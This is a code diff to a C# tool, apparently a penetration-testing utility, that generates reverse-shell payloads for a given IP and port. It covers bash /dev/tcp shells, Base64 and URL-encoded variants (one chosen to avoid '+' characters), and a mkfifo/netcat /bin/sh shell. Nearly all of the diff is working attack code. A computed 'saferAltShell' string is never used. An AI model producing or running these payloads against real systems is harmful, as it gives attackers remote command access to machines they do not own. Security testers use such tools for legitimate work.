@@ -108,15 +108,24 @@ namespace Reecon
         {
             // http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
             string shell = $"bash -i >& /dev/tcp/{ip}/{port} 0>&1";
+            string altShell = $"bash -i &>/dev/tcp/{ip}/{port} <&1";
             string saferShell = "bash -c \"" + shell + "\"";
+            string saferAltShell = "bash -c \"" + altShell + "\"";
             string saferBase64Shell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(saferShell));
+            string saferBase64AltShell = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes(altShell));
             string saferURLEncodedShell = $"bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{ip}%2F{port}%200%3E%261%22";
-            return "#!/bin/bash" + Environment.NewLine +
-                   shell + Environment.NewLine +
-                   "Note: File header is only required if it's a file and not a command" + Environment.NewLine +
-                   "Safer: " + saferShell + Environment.NewLine +
-                   "Safer Base64: " + saferBase64Shell + Environment.NewLine +
-                   $"Safer URL Encoded: " + saferURLEncodedShell;
+            string toReturn = "#!/bin/bash" + Environment.NewLine +
+                               shell + Environment.NewLine +
+                               "Note: File header is only required if it's a file and not a command" + Environment.NewLine +
+                               "Safer: " + saferShell + Environment.NewLine +
+                               "Safer Base64: " + saferBase64Shell + Environment.NewLine;
+            if (saferBase64Shell.Contains("+") && !saferBase64AltShell.Contains("+"))
+            {
+                toReturn += "Alt Safer Base64 (No +): " + saferBase64AltShell + Environment.NewLine;
+            }
+            toReturn += $"Safer URL Encoded: " + saferURLEncodedShell;
+
+            return toReturn;
         }
 
         private static string JavaShell(string ip, string port)
@@ -169,6 +178,7 @@ namespace Reecon
 
         private static string SHShell(string ip, string port)
         {
+            // Currently just the nc shell - Need one without it...
             return $"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f";
         }
     }
